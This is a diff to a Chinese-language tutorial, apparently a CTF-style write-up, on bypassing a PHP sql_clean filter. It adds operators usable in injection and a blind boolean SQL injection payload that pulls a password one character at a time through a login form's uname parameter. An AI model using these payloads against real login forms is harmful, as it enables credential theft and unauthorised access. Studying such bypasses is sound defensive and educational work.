@@ -29,7 +29,7 @@ function sql_clean($str){
 
 但是仔细想想,我们好像还有操作符啊:
 ```
-!,!=,=,+,-,^,%
+!,!=,=,+,-,^,%,>,<,~
 ```
 我们是否可以通过这些操作符构造出来可以的注入判断语句呢?
 
@@ -100,18 +100,13 @@ select  user  from mysql.user where user=''-!( mid((user)from(-1))='t')='1';
 -> uname='%2d!(mid((passwd)from(-1))='e')='1&passwd=1
 ```
 
+```
+select * from admin where uname=''<(mid((passwd)from(-1))='5')='1';
+-> uname='<(mid((passwd)from(-1))='5')='1&passwd=1
+```
 
+看下面这个sql语句,理解一下:
 
-
-
-
-
-
-
-
-
-
-
-
-
-
+```sql
+select user from mysql.user  where user=~'18446744073709551615';
+```
